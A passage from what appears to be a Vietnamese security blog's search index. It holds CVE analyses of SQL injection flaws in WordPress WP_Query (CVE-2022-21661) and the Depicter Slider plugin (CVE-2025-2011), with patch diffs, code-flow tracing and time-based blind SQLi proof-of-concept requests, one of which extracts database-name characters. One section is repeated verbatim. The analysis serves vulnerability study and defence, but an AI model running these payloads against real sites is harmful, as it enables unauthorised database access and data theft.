overflow:auto;\"\u003e'; echo \"SQL query generated by WP_Query:\\n\\n\"; echo esc_html($query-\u003erequest); // Display executed query echo '\u003c/pre\u003e'; if ($query-\u003ehave_posts()) { echo '\u003cul\u003e'; while ($query-\u003ehave_posts()) { $query-\u003ethe_post(); echo '\u003cli\u003e' . get_the_title() . ' (' . get_the_ID() . ')\u003c/li\u003e'; } echo '\u003c/ul\u003e'; } else { echo '\u003cp\u003eNo posts found.\u003c/p\u003e'; } wp_reset_postdata(); return ob_get_clean(); } add_shortcode('demo_wp_query', 'da_show_posts'); Taxonomy parameters T·∫°o page m·ªõi v·ªõi \u003cpage-title\u003e c√≥ shortcode : [demo_wp_query] üëâ Truy v·∫•n s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã khi truy c·∫≠p http://localhost/\u003cpage-title\u003e Trang demo hi·ªÉn th·ªã k·∫øt qu·∫£ WP_Query ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:2:3","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#custom-plugin"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rwpdb L√† l·ªõp PHP c·ªët l√µi c·ªßa WordPress d√πng ƒë·ªÉ thao t√°c tr·ª±c ti·∫øp v·ªõi MySQL. Cho ph√©p l·∫≠p tr√¨nh vi√™n vi·∫øt v√† th·ª±c thi c√¢u SQL th√¥. WP_Query L√† m·ªôt l·ªõp tr·ª´u t∆∞·ª£ng h√≥a gi√∫p l·∫•y d·ªØ li·ªáu b√†i vi·∫øt (post) t·ª´ database m√† kh√¥ng c·∫ßn vi·∫øt SQL tr·ª±c ti·∫øp. L·∫≠p tr√¨nh vi√™n ch·ªâ c·∫ßn truy·ªÅn v√†o m·∫£ng tham s·ªë (args), WordPress s·∫Ω t·ª± ƒë·ªông d·ª±ng c√¢u SQL ph√π h·ª£p. M·ªëi quan h·ªá WP_Query kh√¥ng tr·ª±c ti·∫øp truy v·∫•n MySQL. Thay v√†o ƒë√≥, n√≥ x√¢y d·ª±ng c√¢u SQL d·ª±a tr√™n args, √°p d·ª•ng c√°c b∆∞·ªõc ki·ªÉm tra/validate, r·ªìi g·ªçi $wpdb ƒë·ªÉ th·ª±c thi. ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rWordPress l√† m·ªôt d·ª± √°n m√£ ngu·ªìn m·ªü v·ªõi kho l∆∞u tr·ªØ ƒë∆∞·ª£c c√¥ng khai tr√™n GitHub. V√¨ v·∫≠y, m·ªçi b·∫£n v√° ƒë·ªÅu ƒë∆∞·ª£c commit tr·ª±c ti·∫øp t·∫°i ƒë√¢y. Do ƒë√≥, ƒë·ªÉ ph√¢n t√≠ch m·ªôt l·ªó h·ªïng, ta ch·ªâ c·∫ßn t√¨m ƒë·∫øn commit li√™n quan v√† quan s√°t s·ª± thay ƒë·ªïi trong m√£ ngu·ªìn. Trong ph·∫ßn reference c·ªßa CVE-2022-21661, c√≥ li√™n k·∫øt ƒë·∫øn commit tr√™n GitHub: So s√°nh b·∫£n v√° gi·ªØa hai phi√™n b·∫£n L·ªó h·ªïng ƒë∆∞·ª£c v√° trong file src/wp-includes/class-wp-tax-query.php B·∫£n l·ªói $query['terms'] = array_unique( (array) $query['terms'] ); √âp $query['terms'] th√†nh m·∫£ng v√† lo·∫°i b·ªè gi√° tr·ªã tr√πng l·∫∑p. Kh√¥ng c√≥ b∆∞·ªõc ki·ªÉm tra ho·∫∑c √©p ki·ªÉu d·ªØ li·ªáu, d·∫´n ƒë·∫øn nguy c∆° ch√®n d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá v√†o truy v·∫•n SQL. V√≠ d·ª•: $args = [ 'post_type' =\u003e 'post', 'tax_query' =\u003e [ [ 'taxonomy' =\u003e 'category', 'field' =\u003e 'term_taxonomy_id', 'terms' =\u003e ['1) AND (SELECT SLEEP(5)) # '], 'operator' =\u003e 'IN', ], ], ]; B·∫£n v√° if ( 'slug' === $query['field'] || 'name' === $query['field'] ) { $query['terms'] = array_unique( (array) $query['terms'] ); } else { $query['terms'] = wp_parse_id_list( $query['terms'] ); } B·ªï sung ƒëi·ªÅu ki·ªán d·ª±a v√†o $query['field']: N·∫øu l√† slug ho·∫∑c name =\u003e gi·ªØ nguy√™n c√°ch x·ª≠ l√Ω c≈©. N·∫øu l√† ID =\u003e d√πng wp_parse_id_list() ƒë·ªÉ √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n an to√†n. Ta bi·∫øt ƒë√¢y l√† b∆∞·ªõc √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n b·ªüi v√¨ trong tax_query1, tham s·ªë field ch·ªâ nh·∫≠n 4 gi√° tr·ªã: slug, name, term_taxonomy_id v√† term_id. Trong ƒë√≥, hai tr∆∞·ªùng term_taxonomy_id v√† term_id thu·ªôc b·∫£ng wp_term_taxonomy v√† ƒë·ªÅu c√≥ ki·ªÉu d·ªØ li·ªáu BIGINT UNSIGNED. mysql\u003e DESC wp_term_taxonomy; +------------------+-----------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +------------------+-----------------+------+-----+---------+----------------+ | term_taxonomy_id | bigint unsigned | NO | PRI | NULL | auto_increment | | term_id | bigint unsigned | NO | MUL | 0 | | | taxonomy | varchar(32) | NO | MUL | | | | description | longtext | NO | | NULL | | | parent | bigint unsigned | NO | | 0 | | | count | bigint | NO | | 0 | | +------------------+-----------------+------+-----+---------+----------------+ 6 rows in set (0.01 sec) ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it work?\rBreakpoint t·∫°i ƒë·∫ßu h√†m clean_query Ti·∫øp t·ª•c ƒë·∫øn query c√≥ taxonomy kh·ªõp Quan s√°t wp_list_pluck ghi ƒë√® terms Tr√°nh ghi ƒë√® terms b·∫±ng return s·ªõm Payload gi·ªØ nguy√™n trong truy v·∫•n th·ª±c thi Flow\rƒê·ªëi t∆∞·ª£ng WP_Query ƒë∆∞·ª£c t·∫°o H√†m __construct c·ªßa WP_Query ƒë∆∞·ª£c g·ªçi G·ªçi get_posts ƒë·ªÉ th·ª±c thi query ƒêi·ªÅu ki·ªán trong get_posts th·ªèa m√£n, g·ªçi get_sql get_sql tr·∫£ v·ªÅ get_sql_clauses get_sql_clauses g·ªçi get_sql_for_query Duy·ªát m·∫£ng query trong get_sql_for_query Ki·ªÉm tra keys terms, taxonomy, operator,... G·ªçi get_sql_for_clause Bypass clean_query gi·ªØ nguy√™n payload Payload g√°n v√†o $sql['where'] Th√™m () v√†o m·ªánh ƒë·ªÅ WHERE Th√™m AND v√† tr·∫£ v·ªÅ get_sql get_posts nh·∫≠n gi√° tr·ªã t·ª´ get_sql Payload th√™m v√†o $clauses['where'] Quan s√°t last_query t·∫°i n∆°i th·ª±c thi SQL Chart minh h·ªça lu·ªìng th·ª±c thi Bi·ªÉu ƒë·ªì lu·ªìng th·ª±c thi c·ªßa WP_Query d·∫´n ƒë·∫øn SQLi ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#how-it-work"},{"categories":["CVE Analysis"],"collections":null,"content":"How it work?\rBreakpoint t·∫°i ƒë·∫ßu h√†m clean_query Ti·∫øp t·ª•c ƒë·∫øn query c√≥ taxonomy kh·ªõp Quan s√°t wp_list_pluck ghi ƒë√® terms Tr√°nh ghi ƒë√® terms b·∫±ng return s·ªõm Payload gi·ªØ nguy√™n trong truy v·∫•n th·ª±c thi Flow\rƒê·ªëi t∆∞·ª£ng WP_Query ƒë∆∞·ª£c t·∫°o H√†m __construct c·ªßa WP_Query ƒë∆∞·ª£c g·ªçi G·ªçi get_posts ƒë·ªÉ th·ª±c thi query ƒêi·ªÅu ki·ªán trong get_posts th·ªèa m√£n, g·ªçi get_sql get_sql tr·∫£ v·ªÅ get_sql_clauses get_sql_clauses g·ªçi get_sql_for_query Duy·ªát m·∫£ng query trong get_sql_for_query Ki·ªÉm tra keys terms, taxonomy, operator,... G·ªçi get_sql_for_clause Bypass clean_query gi·ªØ nguy√™n payload Payload g√°n v√†o $sql['where'] Th√™m () v√†o m·ªánh ƒë·ªÅ WHERE Th√™m AND v√† tr·∫£ v·ªÅ get_sql get_posts nh·∫≠n gi√° tr·ªã t·ª´ get_sql Payload th√™m v√†o $clauses['where'] Quan s√°t last_query t·∫°i n∆°i th·ª±c thi SQL Chart minh h·ªça lu·ªìng th·ª±c thi Bi·ªÉu ƒë·ªì lu·ªìng th·ª±c thi c·ªßa WP_Query d·∫´n ƒë·∫øn SQLi ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\rThay gi√° tr·ªã c·ªßa terms b·∫±ng payload SQLi: GET /demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a)+%23+ HTTP/1.1 K·∫øt qu·∫£ ph·∫£n h·ªìi cho th·∫•y truy v·∫•n ch·∫≠m do payload ho·∫°t ƒë·ªông ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2022-21661 trong WordPress Core tr∆∞·ªõc phi√™n b·∫£n 5.8.3, quay ng∆∞·ª£c ƒë·∫øn t·∫≠n phi√™n b·∫£n 3.7.37, xu·∫•t ph√°t t·ª´ vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (sanitization) kh√¥ng ƒë√∫ng c√°ch trong WP_Query d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection. ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger CVE-2022-21661 Detail ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:6:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Notes\rV√¨ patch n·∫±m trong file src/wp-includes/class-wp-tax-query.php, file n√†y ƒë·ªãnh nghƒ©a class WP_Tax_Query, ch·ªãu tr√°ch nhi·ªám x·ª≠ l√Ω tham s·ªë tax_query trong WP_Query. N·∫øu c√≥ thay ƒë·ªïi trong file n√†y th√¨ g·∫ßn nh∆∞ ch·∫Øc ch·∫Øn n√≥ li√™n quan ƒë·∫øn qu√° tr√¨nh parse/validate c·ªßa tax_query.¬†‚Ü©Ô∏é ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:7:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#notes"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Depicter Slider Plugin.","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analysis"],"collections":null,"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Depicter Slider c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.6.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin. CVE ID: CVE-2025-2011 Product: WordPress Depicter Slider Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.6.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Depicter Slider: v3.6.1(vul) v√† v3.6.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version ","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω. ","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rD√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file app/src/Controllers/Ajax/LeadsAjaxController.php index, list, export l√† 3 h√†m ƒë√°ng ch√∫ √Ω n·∫±m trong class LeadsAjaxController public function index(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::lead()-\u003eget($args); $statusCode = isset($response['errors']) ? 400 : 200; return \\Depicter::json($response)-\u003ewithStatus($statusCode); } public function list(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); return \\Depicter::json($response); } public function export(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); // other logic return \\Depicter::json([ 'errors' =\u003e [__('error occurred during the export process', 'depicter')] ])-\u003ewithStatus(400); } C·∫£ 3 h√†m ƒë·ªÅu ƒë∆∞·ª£c v√° b·∫±ng c√°ch s·ª≠ d·ª•ng Sanitize::sql thay cho Sanitize::textfield nh·∫±m ƒë·∫£m b·∫£o param 's' ƒë∆∞·ª£c l√†m s·∫°ch v√† escape ph√π h·ª£p cho ng·ªØ c·∫£nh c√¢u l·ªánh SQL. ·∫¢nh minh h·ªça s·ª± kh√°c bi·ªát b·∫£n v√° v√† b·∫£n l·ªói ","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it work?\rƒê·ªÉ hi·ªÉu r√µ h∆°n ch·ª©c nƒÉng c·ªßa textfield v√† sql ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a function textfield, c√≥ l·∫Ω ch√∫ng ƒë∆∞·ª£c ƒë·∫∑t trong c√πng 1 file v√¨ ƒë∆∞·ª£c g·ªçi b·∫±ng c√πng 1 class Sanitize N·∫øu b·∫°n ƒë√£ c√†i PHP Intelephense Extension trong vscode, b·∫°n c√≥ th·ªÉ di chuy·ªÉn ƒë·∫øn h√†m c·ª• th·ªÉ b·∫±ng c√°ch Ctrl + Click v√†o h√†m c·∫ßn ƒë·∫øn. T√¨m ki·∫øm h√†m textfield trong class Sanitize textfield tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c sanitize b·∫±ng sanitize_text_field, sql c≈©ng l√† h√†m trong c√πng class, tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c escape SQL public static function sql( $input ) { return esc_sql( $input ); } V√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated, vi·ªác c√≥ 3 h√†m nh∆∞ n√†y, ta c·∫ßn x√°c ƒë·ªãnh xem ƒëi·ªÉm g·ªçi ƒë·∫øn ch√∫ng c√≥ c∆° ch·∫ø x√°c th·ª±c hay kh√¥ng. Ch·ªâ sau khi ch·∫Øc ch·∫Øn r·∫±ng h√†m n√†o th·ª±c s·ª± ƒë∆∞·ª£c g·ªçi trong b·ªëi c·∫£nh kh√¥ng y√™u c·∫ßu x√°c th·ª±c, ta m·ªõi ti·∫øp t·ª•c ph√¢n t√≠ch ph·∫ßn logic b√™n trong ƒë·ªÉ ki·ªÉm tra kh·∫£ nƒÉng g√¢y ra SQL Injection gi√∫p gi·ªõi h·∫°n ph·∫°m vi truy v·∫øt. ƒê·ªÉ x√°c ƒë·ªãnh 3 h√†m tr√™n ƒë∆∞·ª£c g·ªçi ·ªü ƒë√¢u, ta c√≥ th·ªÉ t√¨m ki·∫øm tr·ª±c ti·∫øp theo t√™n h√†m. Tuy nhi√™n, c√°c t·ª´ kh√≥a nh∆∞ index, list, hay export l·∫°i qu√° ph·ªï bi·∫øn n√™n k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω r·∫•t nhi·ªÅu v√† kh√≥ l·ªçc. V√¨ v·∫≠y, thay v√¨ t√¨m theo t√™n h√†m, ta t√¨m v·ªõi t·ª´ kh√≥a l√† t√™n class LeadsAjaxController. B·ªüi l·∫Ω khi ƒë∆∞·ª£c s·ª≠ d·ª•ng, c√°c h√†m n√†y ƒë·ªÅu ph·∫£i ƒë∆∞·ª£c g·ªçi th√¥ng qua class, nh·ªù ƒë√≥ ph·∫°m vi k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω ƒë∆∞·ª£c thu h·∫πp v√† d·ªÖ d√†ng h∆°n. K·∫øt qu·∫£ t√¨m ki·∫øm LeadsAjaxController trong m√£ ngu·ªìn üëâ LeadsAjaxController ƒë∆∞·ª£c s·ª≠ d·ª•ng trong qu√° tr√¨nh ƒëƒÉng k√Ω route Ajax. Khi c√≥ request g·ª≠i t·ªõi endpoint /wp-admin/admin-ajax.php?action=action_here\u0026param1=param1_here\u0026paramN=paramN_here, h·ªá th·ªëng s·∫Ω d·ª±a tr√™n khai b√°o handle('LeadsAjaxController@function') ƒë·ªÉ g·ªçi t·ªõi ph∆∞∆°ng th·ª©c t∆∞∆°ng ·ª©ng trong class LeadsAjaxController C·∫£ ba h√†m ta ƒëang focus ƒë·ªÅu ƒë∆∞·ª£c g·ªçi b·∫±ng ph∆∞∆°ng th·ª©c GET, nh∆∞ng export l·∫°i c√≥ middleware x·ª≠ l√Ω csrf-api, n√™n ta b·ªè qua. Ch·ªâ truy v·∫øt index v√† list Khi ph√¢n t√≠ch hai h√†m n√†y, ta th·∫•y trong h√†m index, bi·∫øn $response ƒë∆∞·ª£c g√°n gi√° tr·ªã t·ª´ \\Depicter::lead()-\u003eget($args). Tuy nhi√™n, ph∆∞∆°ng th·ª©c get() l·∫°i ti·∫øp t·ª•c g·ªçi ƒë·∫øn \\Depicter::leadRepository()-\u003egetResults($args), t·ª©c l√† c√πng m·ªôt logic m√† h√†m list ƒë√£ g·ªçi tr·ª±c ti·∫øp. Do ƒë√≥, ta ch·ªçn h√†m list l√†m ƒëi·ªÉm truy v·∫øt ch√≠nh. public function list(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), 'ids' =\u003e Sanitize::textfield($request-\u003equery('ids', '')), 'sources' =\u003e Sanitize::textfield($request-\u003equery('sources', '')), 'dateStart' =\u003e Sanitize::textfield($request-\u003equery('dateStart', '')), 'dateEnd' =\u003e Sanitize::textfield($request-\u003equery('dateEnd', '')), 'order' =\u003e Sanitize::textfield($request-\u003equery('order', 'DESC')), 'orderBy' =\u003e Sanitize::textfield($request-\u003equery('orderBy', 'id')), 'page' =\u003e Sanitize::int($request-\u003equery('page', 1)), 'perPage' =\u003e Sanitize::int($request-\u003equery('perpage', 10)), 'columns' =\u003e Sanitize::textfield($request-\u003equery('columns', '')), 'includeFields' =\u003e Sanitize::textfield($request-\u003equery('includeFields', false)), 'skipCustomFields' =\u003e Sanitize::textfield($request-\u003equery('skipCustomFields', false)) ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); return \\Depicter::json($response); } ƒê·ªÉ bi·∫øt getResults th·ª±c thi query nh∆∞ n√†o, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a function getResults ho·∫∑c Ctrl + Click v√†o getResults V·ªã tr√≠ ƒë·ªãnh nghƒ©a h√†m getResults trong LeadRepository üëâ Khi t√¨m ki·∫øm, ta th·∫•y k·∫øt qu·∫£ c√≥ hai h√†m getResults. D·ª±a v√†o t√™n class c√≥ th·ªÉ nh·∫≠n th·∫•y s·ª± li√™n quan gi·ªØa class LeadRepository v√† h√†m leadRepository(), nhi·ªÅu kh·∫£ nƒÉng Depicter::leadRepository() s·∫Ω tr·∫£ v·ªÅ m·ªôt instance c·ªßa class LeadRepository. B√™n c·∫°nh ƒë√≥, ta c√≥ th·ªÉ d·ª±a v√†o s·ªë l∆∞·ª£ng tham s·ªë truy·ªÅn v√†o ƒë·ªÉ x√°c ƒë·ªãnh ch√≠nh x√°c h√†m getResults n√†o m·ªõi l√† h√†m c·∫ßn ph√¢n t√≠ch. Ta th·∫•y ƒëi·ªÅu ki·ªán if,khi kh√¥ng c√≥ param includeFields th√¨ getLeadsResults s·∫Ω ƒë∆∞·ª£c g·ªçi, quan s√°t getLeadsResults trong c√πng class: protected function getLeadsResults( $args ){ // Purpose of joining tables is being able to search in leadField values as well $leadTable = $this-\u003elead()-\u003egetTable(); $leads = Lead::new()-\u003eselect( \"{$leadTable}","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#how-it-work"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect SQLi\rG·ª≠i GET request ch·ª©a payload SQLi. GET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026s=999%25'+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here Payload ƒë∆∞·ª£c decode: 999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- - Khi ƒë√≥ m·ªôt ph·∫ßn c·ªßa c√¢u query tr·ªü th√†nh AND (lf.value like '999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- ' OR leadtable.content_name like '999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #') Th·ªùi gian ph·∫£n h·ªìi th·ªÉ hi·ªán payload ho·∫°t ƒë·ªông üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u003e payload ho·∫°t ƒë·ªông. Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. ","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#detect-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Get First Letter of Database Name\rƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c. G·ª≠i request v·ªõi SQLi payload: GET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026s=999%25'+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(‚Äòw‚Äô) S·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ s ƒë∆∞·ª£c l·∫•y t·ª´ GET request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field. üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u003e k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w. ","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#get-first-letter-of-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-2011 trong plugin WordPress Depicter Slider tr∆∞·ªõc phi√™n b·∫£n 3.6.2, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection. B·∫£n v√° ƒë√£ escape SQL khi·∫øn d·ªØ li·ªáu tr∆∞·ªõc khi ƒë∆∞a v√†o tr·ªü th√†nh chu·ªói thu·∫ßn kh√¥ng th·ªÉ tho√°t ra kh·ªèi '%...%' Key takeaways: Ki·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u003eprepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. ","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger WordPress Depicter Slider Plugin \u003c= 3.6.1 is vulnerable to SQL Injection ","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Woocommerce Partial Shipment Plugin.","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analysis"],"collections":null,"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Woocommerce Partial Shipment c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu 